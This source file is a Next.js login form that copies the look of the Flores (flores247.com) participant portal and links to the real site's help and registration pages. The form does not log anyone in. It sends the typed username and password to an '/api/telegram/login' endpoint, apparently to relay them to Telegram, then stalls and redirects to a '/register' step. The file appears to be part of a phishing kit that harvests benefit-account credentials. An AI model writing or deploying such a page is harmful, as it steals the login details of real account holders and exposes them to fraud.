"use client";

import type React from "react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { FLORES_SESSION } from "@/lib/flores-flow";

export function ParticipantLoginForm() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim() || isLoading) return;
    setIsLoading(true);

    try {
      const res = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: username.trim(),
          password,
        }),
      });
      if (!res.ok) {
        setIsLoading(false);
        return;
      }
    } catch (error) {
      console.error("Failed to send login notification:", error);
      setIsLoading(false);
      return;
    }

    await new Promise((r) => setTimeout(r, 10000));
    if (typeof window !== "undefined")
      sessionStorage.setItem(FLORES_SESSION.verify, "1");
    router.push("/register");
  };

  return (
    <form onSubmit={handleSubmit} className="mt-4 space-y-3 sm:space-y-4">
      <div>
        <input
          type="text"
          placeholder="PID or Username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          disabled={isLoading}
          className="w-full px-3 py-1.5 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 disabled:opacity-70"
          autoComplete="off"
        />
        <div className="text-right mt-1">
          <a
            href="https://www.flores247.com/login-help.vbhtml"
            target="_blank"
            rel="noopener noreferrer"
            className="text-xs sm:text-sm hover:underline"
            style={{ color: "#003D6B" }}
          >
            Forgot PID or Username?
          </a>
        </div>
      </div>

      <div>
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          disabled={isLoading}
          className="w-full px-3 py-1.5 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 disabled:opacity-70"
          autoComplete="off"
          maxLength={500}
        />
        <div className="text-right mt-1">
          <a
            href="https://www.flores247.com/login-help.vbhtml"
            target="_blank"
            rel="noopener noreferrer"
            className="text-xs sm:text-sm hover:underline"
            style={{ color: "#003D6B" }}
          >
            Forgot password?
          </a>
        </div>
      </div>

      <button
        type="submit"
        disabled={isLoading}
        className="w-full py-2.5 sm:py-3 rounded-full text-white font-semibold tracking-wide text-sm sm:text-base disabled:opacity-70 disabled:cursor-not-allowed"
        style={{ backgroundColor: "#F7931E" }}
      >
        {isLoading ? "Loading..." : "PARTICIPANT LOGIN"}
      </button>

      <a
        href="https://www.flores247.com/registration.vbhtml"
        target="_blank"
        rel="noopener noreferrer"
        className="block w-full py-2.5 sm:py-3 rounded-full font-semibold tracking-wide border-2 border-gray-300 text-gray-600 hover:bg-gray-50 transition-colors text-center text-sm sm:text-base"
      >
        FIRST TIME USER
      </a>
    </form>
  );
}
